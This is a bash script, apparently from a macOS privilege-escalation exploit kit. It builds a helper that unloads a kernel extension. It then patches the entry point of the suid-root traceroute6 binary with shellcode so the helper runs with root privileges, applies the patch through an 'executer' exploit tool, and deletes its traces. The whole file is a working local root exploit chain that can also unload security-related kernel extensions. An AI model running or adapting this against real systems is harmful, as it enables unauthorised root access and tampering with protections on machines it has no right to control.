#!/bin/bash

# we don't need to bypass any signature checks to unload a kext

# so let's build a simple shellscript to run as root:
if [ -z $1 ]
then
  echo 'usage: ./unload_kext.sh <path/to/kext>'
  exit $E_MISSING_POS_PARAM
fi

echo '#!/bin/zsh' > kext_unloading_helper.sh
echo "# run me as root to unload: $1" >> kext_unloading_helper.sh
echo "`which kextunload` $1" >> kext_unloading_helper.sh
chmod +x kext_unloading_helper.sh

# build a binary patch to apply to traceroute6 (a suid-root binary, any will do though*) which overwrites
# its entrypoint with shellcode to exec the script we just wrote (note that its a zsh script so will maintain euid 0)
python build_exec_patch.py `which traceroute6` `pwd`/kext_unloading_helper.sh traceroute6_exec_kextunloader.binpatch

# use the exploit to apply that patch at exec time to the suid-root binary
./executer -p traceroute6_exec_kextunloader.binpatch -o `which traceroute6` -- `which traceroute6` -invalid

# cleanup
rm -rf kext_unloading_helper.sh traceroute6_exec_kextunloader.binpatch

# * if you choose a fat binary pass a lipo'ed thin version to -o
